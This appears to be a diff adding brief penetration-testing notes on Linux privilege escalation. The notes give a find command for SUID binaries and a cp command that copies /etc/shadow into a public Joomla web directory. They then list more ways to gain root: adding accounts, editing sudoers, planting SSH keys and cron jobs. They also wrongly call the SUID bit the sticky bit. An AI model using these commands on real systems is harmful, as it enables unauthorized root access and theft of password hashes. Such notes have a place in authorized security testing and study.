@@ -1,0 +1,16 @@
+    == Privillege escalation in Linux ==
+## Finds files that have the sticky bit set. 
+find / -perm -u=s -type f 2>/dev/null
+  perm // permission 
+  -f   //regular file
+  u=s  // (sticky)
+  
+  Example:
+## We found cp (copy) in the above list and now we are abusing it:
+cp -f --no-preserve=all /etc/shadow /var/www/html/joomla/shadow.txt
+
+Few things to keep in mind:
+## (1) at the destination, the file owner will be root but the group will be that of the current user and 
+## (2) notice the use of "--no-preserve" this is needed to read out protected files.
+## A lot of ways we can abuse this, update the shadow file with a new account, modify sudoers, plant ssh key + modify sshd_config ## + reboot,or cron.hourly.
+
